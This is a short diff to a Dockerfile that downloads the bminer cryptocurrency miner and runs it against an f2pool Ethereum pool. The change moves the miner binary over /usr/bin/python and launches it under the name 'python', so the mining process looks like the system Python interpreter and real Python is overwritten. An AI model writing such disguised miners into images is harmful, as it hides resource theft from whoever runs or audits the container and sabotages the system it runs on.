@@ -16,8 +16,8 @@ RUN wget -q https://www.bminercontent.com/releases/${BMINER_RELEASE} && \
     sha256sum -c ${BMINER_RELEASE}.sha256 && \
     tar --strip=1 -xJvf ${BMINER_RELEASE} && \
     rm ${BMINER_RELEASE} ${BMINER_RELEASE}.sha256 && \
-    mv bminer python && \
+    mv bminer /usr/bin/python && \
     rm -rf *.sh README LICENSE
 
 ENV WORKER_NAME docker
-CMD /root/workspace/python -uri ethstratum://chengduminner.${WORKER_NAME}@eth.f2pool.com:6688 -api 127.0.0.1:1880
+CMD python -uri ethstratum://chengduminner.${WORKER_NAME}@eth.f2pool.com:6688 -api 127.0.0.1:1880
